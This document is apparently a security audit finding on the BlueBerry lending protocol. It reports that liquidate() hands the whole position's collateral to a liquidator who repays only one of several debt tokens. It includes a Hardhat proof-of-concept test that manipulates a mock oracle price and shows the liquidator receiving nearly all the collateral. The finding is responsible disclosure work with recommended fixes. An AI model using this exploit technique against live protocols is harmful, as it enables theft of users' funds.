cducrest-brainbot

high

# Liquidate pays out full colateral for one token repaid

## Summary

In `BlueBerryBank.sol`, the `liquidate` function allows any user to repay the debt of a liquidatable position for a specific token and send the collateral of the position to the liquidator. However, how it is implemented means that for a position with two debt tokens, the liquidator can fully repay the debt of only one of the tokens and receive the full collateral while they should receive only part of it.

## Vulnerability Detail

Liquidate will check if a debt is liquidatable (line 517) which checks the liquidation criteria using the collateral and the debt value of every debt tokens in the position (getDebtValue line 451). However, it then only consider the debt share of a single token for repaying the debt and checking which portion of collateral to send to the liquidator (line 522 - 531).

## Impact

If a user borrowed 300 USDC with 100 ICHI collateral and 3 ICHI with 1 ICHI collateral, and becomes liquidatable (e.g. through the fall of ICHI price), anyone can repay the 3 ICHI debt and receive the full 101 ICHI collateral as reward.

## Code Snippet

Liquidate function:

https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L511-L572

getDebtValue, showing how it takes into account every debt token of the position: 

https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L451-L475

## Tool used

Manual Review

Testing:

<details><summary>bank.test.ts</summary>
<p>

```typescript
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import chai, { expect } from 'chai';
import { BigNumber, constants, utils } from 'ethers';
import { ethers, upgrades } from 'hardhat';
import {
	BlueBerryBank,
	CoreOracle,
	IchiVaultSpell,
	IWETH,
	SoftVault,
	MockOracle,
	IchiLpOracle,
	WERC20,
	WIchiFarm,
	ProtocolConfig,
	MockIchiVault,
	ERC20,
	MockIchiV2,
	MockIchiFarm,
	HardVault
} from '../typechain-types';
import { ADDRESS, CONTRACT_NAMES } from '../constant';
import SpellABI from '../abi/IchiVaultSpell.json';

import { solidity } from 'ethereum-waffle'
import { near } from './assertions/near'
import { roughlyNear } from './assertions/roughlyNear'
import { Protocol, setupProtocol } from './setup-test';

chai.use(solidity)
chai.use(near)
chai.use(roughlyNear)

const CUSDC = ADDRESS.bUSDC;
const WETH = ADDRESS.WETH;
const USDC = ADDRESS.USDC;
const ICHI = ADDRESS.ICHI;
const ICHIV1 = ADDRESS.ICHI_FARM;
const ICHI_VAULT_PID = 0; // ICHI/USDC Vault PoolId

describe('Bank', () => {
	let admin: SignerWithAddress;
	let alice: SignerWithAddress;
	let treasury: SignerWithAddress;

	let usdc: ERC20;
	let ichi: MockIchiV2;
	let ichiV1: ERC20;
	let weth: IWETH;
	let werc20: WERC20;
	let mockOracle: MockOracle;
	let ichiOracle: IchiLpOracle;
	let oracle: CoreOracle;
	let spell: IchiVaultSpell;
	let wichi: WIchiFarm;
	let bank: BlueBerryBank;
	let config: ProtocolConfig;
	let usdcSoftVault: SoftVault;
	let ichiSoftVault: SoftVault;
	let hardVault: HardVault;
	let ichiFarm: MockIchiFarm;
	let ichiVault: MockIchiVault;
	let protocol: Protocol;

	before(async () => {
		[admin, alice, treasury] = await ethers.getSigners();
		usdc = <ERC20>await ethers.getContractAt("ERC20", USDC);
		ichi = <MockIchiV2>await ethers.getContractAt("MockIchiV2", ICHI);
		ichiV1 = <ERC20>await ethers.getContractAt("ERC20", ICHIV1);
		weth = <IWETH>await ethers.getContractAt(CONTRACT_NAMES.IWETH, WETH);

		protocol = await setupProtocol();
		config = protocol.config;
		bank = protocol.bank;
		spell = protocol.spell;
		ichiFarm = protocol.ichiFarm;
		ichiVault = protocol.ichi_USDC_ICHI_Vault;
		wichi = protocol.wichi;
		werc20 = protocol.werc20;
		oracle = protocol.oracle;
		mockOracle = protocol.mockOracle;
		usdcSoftVault = protocol.usdcSoftVault;
		ichiSoftVault = protocol.ichiSoftVault;
		hardVault = protocol.hardVault;
	})

	beforeEach(async () => {
	})

	describe("Liquidation", () => {
		const depositAmount = utils.parseUnits('100', 18); // worth of $400
		const borrowAmount = utils.parseUnits('300', 6);
		const iface = new ethers.utils.Interface(SpellABI);

		beforeEach(async () => {
			await usdc.approve(bank.address, ethers.constants.MaxUint256);
			await ichi.approve(bank.address, ethers.constants.MaxUint256);
			await bank.execute(
				0,
				spell.address,
				iface.encodeFunctionData("openPosition", [
					0,
					ICHI,
					USDC,
					depositAmount,
					borrowAmount // 3x
				])
			)

			await bank.execute(
				1,
				spell.address,
				iface.encodeFunctionData("openPosition", [
					0,
					ICHI,
					ICHI,
					utils.parseUnits('1', 18),
					utils.parseUnits('3', 18), // 3x
				])
			)
		})
		it.only("should be able to liquidate the position => (OV - PV)/CV = LT", async () => {
			await ichiVault.rebalance(-260400, -260200, -260800, -260600, 0);

			const positionInfoBefore = await bank.getPositionInfo(1);
			console.log(positionInfoBefore)

			console.log('===ICHI token dumped from $5 to $1===');
			await mockOracle.setPrice(
				[ICHI],
				[
					BigNumber.from(10).pow(17).mul(10), // $0.5
				]
			);

			expect(await bank.isLiquidatable(1)).to.be.true;

			const ichiBalanceBefore = await ichi.balanceOf(alice.address)
			const aliceIchiSoftVaultBalanceBefore = await ichiSoftVault.balanceOf(alice.address)

			await ichi.connect(alice).approve(bank.address, ethers.constants.MaxUint256)
			await expect(
				bank.connect(alice).liquidate(1, ICHI, utils.parseUnits('3', 18))
			).to.be.emit(bank, "Liquidate");
			
			const positionInfo = await bank.getPositionInfo(1);
			console.log(positionInfo)

			const ichiBalanceAfter = await ichi.balanceOf(alice.address)
			const aliceIchiSoftVaultBalanceAfter = await ichiSoftVault.balanceOf(alice.address)

			expect(positionInfo.collateralSize).to.be.lt(utils.parseUnits('1', 2))  // position is almost 0 (due to fees / rounding it's not 0)
			expect(positionInfoBefore.collateralSize.sub(positionInfo.collateralSize)).to.be.roughlyNear(positionInfoBefore.collateralSize)  // position is almost 0

			expect((ichiBalanceBefore.sub(ichiBalanceAfter).toString())).to.equal(utils.parseUnits('3', 18))  // alice repaid 3
			expect(aliceIchiSoftVaultBalanceAfter.sub(aliceIchiSoftVaultBalanceBefore)).to.be.roughlyNear(positionInfoBefore.underlyingVaultShare)  // alice received roughly all the share
		})
	})
})
```

</p>
</details>

## Recommendation

One fix is not to allow partial liquidation and only allow for liquidations if the liquidator pays out the debt for every token in the position. This comes with the challenge that positions with unpopular debt tokens are hard to liquidate, and that users may not be willing to use `type(uint256).max` as repaid amount for fear of front-running transactions that may accrue additional debt, so there will always be dust amount of debts.

The other solution is to calculate the value of debt repaid compared to the total debt and only transfer that share of collateral to the liquidator.